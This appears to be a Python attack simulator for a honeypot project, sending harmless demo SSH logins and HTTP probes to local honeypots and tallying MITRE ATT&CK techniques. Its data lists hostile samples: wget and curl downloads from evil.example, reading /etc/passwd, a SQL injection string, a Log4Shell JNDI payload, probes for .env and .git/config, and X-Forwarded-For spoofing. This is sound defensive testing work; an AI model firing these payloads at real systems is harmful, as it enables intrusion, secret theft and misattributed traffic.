"""Attack simulator for HoneyBadger.

Sends realistic, harmless attack traffic to the SSH and HTTP honeypots so a
demo or a test has events to show. Every login is fake and every "download"
is a command typed into the fake shell: nothing is fetched or executed.

Usage (from the backend directory, or inside the backend container):
    python -m sim.simulate                      # 10 SSH attacks + HTTP probes
    python -m sim.simulate --count 25 --delay 0.1
    python -m sim.simulate --skip-http --no-check
    python -m sim.simulate --spoof-sources          # HTTP probes appear to come from 10 countries

--spoof-sources sends each HTTP probe once from every address in SPOOF_SOURCES,
using the X-Forwarded-For header, so the world map and GeoIP panels have data in a
local demo. SSH attacks always come from the real connection address (127.0.0.1).

After the run it asks the API which MITRE ATT&CK techniques were recorded
for the new events and prints the counts (use --no-check to skip).
"""

from __future__ import annotations

import argparse
import asyncio
import datetime as dt
import logging
from collections import Counter
from dataclasses import dataclass, replace
from urllib.parse import quote

logger = logging.getLogger("sim.simulate")


@dataclass(frozen=True)
class AttackSpec:
    """One simulated SSH attacker: the credentials it tries and what it types."""

    username: str
    password: str
    commands: tuple[str, ...]


# Each template mirrors a common real-world pattern.
TEMPLATES: tuple[AttackSpec, ...] = (
    AttackSpec("root", "123456", ("whoami", "id", "uname -a")),                       # recon (T1059)
    AttackSpec("admin", "admin", ("cat /etc/passwd", "ps aux")),                        # recon (T1059)
    AttackSpec("ubuntu", "ubuntu", ("wget http://evil.example/bot.sh",)),               # tool transfer (T1105)
    AttackSpec("pi", "raspberry", ("curl -O http://evil.example/miner", "history")),   # T1105 + T1059
)

# HTTP probes: (method, path, form data or None, user agent)
HTTP_PROBES: tuple[tuple[str, str, dict[str, str] | None, str], ...] = (
    ("GET", "/.env", None, "Mozilla/5.0 (compatible; scanner)"),                       # T1595
    ("GET", "/.git/config", None, "Mozilla/5.0 (compatible; scanner)"),                # T1595
    ("GET", "/phpinfo.php", None, "Mozilla/5.0 (compatible; scanner)"),                # T1595
    ("POST", "/wp-login.php", {"log": "admin", "pwd": "password123"}, "Mozilla/5.0"),  # T1110 family
    ("GET", "/?id=" + quote("1' OR 1=1--"), None, "sqlmap/1.7"),                       # T1190
    ("GET", "/", None, "${jndi:ldap://evil.example/a}"),                               # T1190 (Log4Shell)
)

# Public addresses of well-known DNS resolvers, registries and CDNs, one or two per continent.
# Used only as the claimed X-Forwarded-For source of demo probes; no traffic is sent to them.
SPOOF_SOURCES: tuple[str, ...] = (
    "8.8.8.8",          # Google DNS, United States
    "185.199.108.153",  # GitHub Pages (Fastly), United States
    "13.248.169.48",    # Amazon, Canada
    "200.160.2.3",      # NIC.br, Brazil
    "77.88.8.8",        # Yandex DNS, Russia
    "9.9.9.9",          # Quad9 DNS, Switzerland
    "196.216.2.1",      # AFRINIC, South Africa
    "114.114.114.114",  # 114DNS, China
    "202.12.27.33",     # WIDE Project, Japan
    "1.1.1.1",          # Cloudflare DNS, Australia
)


def probe_plan(spoof_sources: bool) -> list[tuple[str | None, tuple[str, str, dict[str, str] | None, str]]]:
    """Return (claimed source address or None, probe) pairs in the order they are sent.

    Without spoofing, every probe is sent once from the real address. With spoofing,
    the whole probe set is sent once per address in SPOOF_SOURCES.
    """
    sources: tuple[str | None, ...] = SPOOF_SOURCES if spoof_sources else (None,)
    return [(source, probe) for source in sources for probe in HTTP_PROBES]


def probe_headers(agent: str, source: str | None) -> dict[str, str]:
    headers = {"User-Agent": agent}
    if source is not None:
        headers["X-Forwarded-For"] = source
    return headers


def build_attack(number: int) -> AttackSpec:
    """Return the spec for attack *number* (1-based).

    Attacks cycle through TEMPLATES; once every template has been used, the
    username is numbered (``root-5``) so later attackers stay distinguishable.
    """
    if number < 1:
        raise ValueError("attack numbers start at 1")
    template = TEMPLATES[(number - 1) % len(TEMPLATES)]
    if number <= len(TEMPLATES):
        return template
    return replace(template, username=f"{template.username}-{number}")


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="HoneyBadger attack simulator (harmless demo traffic)")
    parser.add_argument("--count", type=int, default=10, help="number of SSH attacks (default 10)")
    parser.add_argument("--delay", type=float, default=0.5, help="seconds between attacks (default 0.5)")
    parser.add_argument("--host", default="127.0.0.1", help="honeypot host (default 127.0.0.1)")
    parser.add_argument("--ssh-port", type=int, default=8022, help="SSH honeypot port (default 8022)")
    parser.add_argument("--http-port", type=int, default=8081, help="HTTP honeypot port (default 8081)")
    parser.add_argument("--api", default="http://127.0.0.1:8090", help="API base URL used for the summary")
    parser.add_argument("--skip-http", action="store_true", help="send SSH attacks only")
    parser.add_argument("--spoof-sources", action="store_true",
                        help=f"send the HTTP probes from {len(SPOOF_SOURCES)} public addresses via X-Forwarded-For, "
                             "so the map has geolocated sources (SSH is not affected)")
    parser.add_argument("--no-check", action="store_true", help="do not query the API after the run")
    parser.add_argument("--verbose", "-v", action="store_true", help="debug logging")
    return parser


async def _ssh_attack(spec: AttackSpec, host: str, port: int) -> int:
    """Log in with the spec's credentials and run its commands. Returns commands sent."""
    import asyncssh

    async with asyncssh.connect(
        host, port=port, username=spec.username, password=spec.password,
        known_hosts=None, client_keys=[], connect_timeout=10,
    ) as conn:
        for command in spec.commands:
            await conn.run(command, check=False, timeout=10)
    return len(spec.commands)


async def _http_probes(host: str, port: int, spoof_sources: bool = False) -> int:
    import aiohttp

    sent = 0
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for source, (method, path, data, agent) in probe_plan(spoof_sources):
            url = f"http://{host}:{port}{path}"
            async with session.request(method, url, data=data, headers=probe_headers(agent, source)) as response:
                await response.read()
                logger.debug("%s %s from %s -> %s", method, path, source or "real address", response.status)
                sent += 1
    return sent


async def _technique_summary(api: str, since: dt.datetime) -> Counter[str]:
    import aiohttp

    params = {"limit": "500", "since": since.strftime("%Y-%m-%dT%H:%M:%SZ")}
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(f"{api}/events", params=params) as response:
            response.raise_for_status()
            items = (await response.json())["items"]
    return Counter(item.get("technique_id") or "untagged" for item in items)


async def run(args: argparse.Namespace) -> int:
    """Run the simulation. Returns a process exit code (0 = every attack sent)."""
    started = dt.datetime.now(dt.timezone.utc).replace(microsecond=0)
    ssh_failures = http_failures = commands = 0
    for number in range(1, args.count + 1):
        spec = build_attack(number)
        try:
            commands += await _ssh_attack(spec, args.host, args.ssh_port)
            logger.info("SSH attack %d/%d as %s: %d commands", number, args.count, spec.username, len(spec.commands))
        except Exception as error:  # keep going: a demo should not stop on one failure
            ssh_failures += 1
            logger.warning("SSH attack %d/%d as %s failed: %s", number, args.count, spec.username, error)
        if args.delay > 0:
            await asyncio.sleep(args.delay)

    probes = 0
    if not args.skip_http:
        try:
            probes = await _http_probes(args.host, args.http_port, args.spoof_sources)
        except Exception as error:
            http_failures += 1
            logger.warning("HTTP probes failed: %s", error)

    planned = 0 if args.skip_http else len(probe_plan(args.spoof_sources))
    spoofed = f" from {len(SPOOF_SOURCES)} spoofed public addresses" if args.spoof_sources and not args.skip_http else ""
    print(f"Sent {args.count - ssh_failures} of {args.count} SSH attacks ({commands} commands) "
          f"and {probes} of {planned} HTTP probes{spoofed}.")

    if not args.no_check:
        await asyncio.sleep(1.0)  # let the enrichment pipeline store the last events
        try:
            counts = await _technique_summary(args.api, started)
            print("Events recorded since the run started, by MITRE technique:")
            for technique, count in counts.most_common():
                print(f"  {technique:10s} {count}")
        except Exception as error:
            print(f"Could not read {args.api}/events ({error}); is the API running?")
    return 0 if ssh_failures == 0 and http_failures == 0 else 1


def main(argv: list[str] | None = None) -> int:
    args = make_parser().parse_args(argv)
    if args.count < 1:
        raise SystemExit("--count must be at least 1")
    if args.delay < 0:
        raise SystemExit("--delay cannot be negative")
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")
    logging.getLogger("asyncssh").setLevel(logging.WARNING)
    return asyncio.run(run(args))


if __name__ == "__main__":
    raise SystemExit(main())
